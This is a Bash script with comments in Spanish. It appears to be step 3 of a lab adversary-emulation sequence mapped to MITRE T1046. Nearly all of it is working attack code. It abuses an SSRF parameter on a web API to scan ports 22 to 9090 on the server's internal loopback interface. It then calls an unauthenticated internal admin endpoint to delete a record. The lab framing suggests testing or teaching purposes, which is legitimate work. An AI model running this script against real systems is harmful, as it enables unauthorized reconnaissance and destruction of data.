#!/usr/bin/env bash
#
# Paso 3 - Fuzzing de puertos internos vía SSRF (T1046)
# Descubrimiento de servicios ocultos en la víctima mediante SSRF
#
# Táctica: Descubrimiento
# Técnica MITRE: T1046 - Network Service Scanning
#
# Uso: ./tests/pasos/03-fuzzing-ssrf.sh [BASE_URL]
#   BASE_URL por defecto: http://192.168.56.112:8080

BASE_URL="${1:-http://192.168.56.112:8080}"
ENDPOINT="$BASE_URL/api/v1/proveedor/status"

echo "==================================================================="
echo " PASO 3: Network Service Scanning via SSRF (T1046)"
echo " Fuzzeando puertos internos en $BASE_URL"
echo "==================================================================="

echo
echo "--- Escaneo de puertos internos (127.0.0.1) ---"
echo "NOTA: Codigo 500 = puerto cerrado, Otro codigo = puerto abierto"
echo
for port in 22 80 443 3306 5432 6379 8080 9090; do
  echo -n "Puerto $port: "
  HTTP_CODE=$(curl -s --max-time 2 -o /dev/null -w "%{http_code}" "$ENDPOINT?url=http://127.0.0.1:$port" || echo "000")
  if [ "$HTTP_CODE" = "500" ] || [ "$HTTP_CODE" = "000" ] || [ "$HTTP_CODE" = "" ]; then
    echo "Cerrado / Sin servicio HTTP"
  else
    echo "ABIERTO (HTTP $HTTP_CODE)"
  fi
done

echo
echo "--- Acceso a admin interno (127.0.0.1:9090/admin/delete?id=1) ---"
RESP=$(curl -s --max-time 3 "$ENDPOINT?url=http://127.0.0.1:9090/admin/delete?id=1")
echo "$RESP"
if echo "$RESP" | grep -q "deleted"; then
  echo "[!] Admin interno descubierto en 127.0.0.1:9090 - sin autenticacion"
fi
echo
